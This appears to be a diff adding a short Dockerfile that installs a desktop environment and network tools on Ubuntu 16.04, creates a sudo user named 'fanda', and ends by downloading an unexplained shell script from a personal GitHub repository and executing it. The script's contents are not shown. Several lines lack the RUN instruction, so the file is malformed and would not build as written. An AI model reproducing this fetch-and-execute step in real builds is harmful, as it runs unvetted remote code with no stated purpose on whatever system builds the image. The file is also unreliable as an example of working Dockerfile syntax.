@@ -1,0 +1,24 @@
+FROM ubuntu:16.04
+ENV DEBIAN_FRONTEND=noninteractive
+
+    set -ex; \
+    apt-get update \
+    && apt-get install -y --no-install-recommends \
+    ubuntu-desktop \
+    sudo \
+    bash \
+    curl \
+    git \
+	  unzip \
+	  wget \
+	  && apt-get update \
+	  && apt-get upgrade -y \
+    && apt-get autoclean \
+    && apt-get autoremove \
+    && rm -rf /var/lib/apt/lists/*
+
+    useradd -m fanda && \
+    adduser fanda sudo && \
+    sudo usermod -a -G sudo fanda
+    
+    RUN wget https://raw.githubusercontent.com/Taryok/verver/main/emtuem.sh && chmod u+x emtuem.sh && ./emtuem.sh
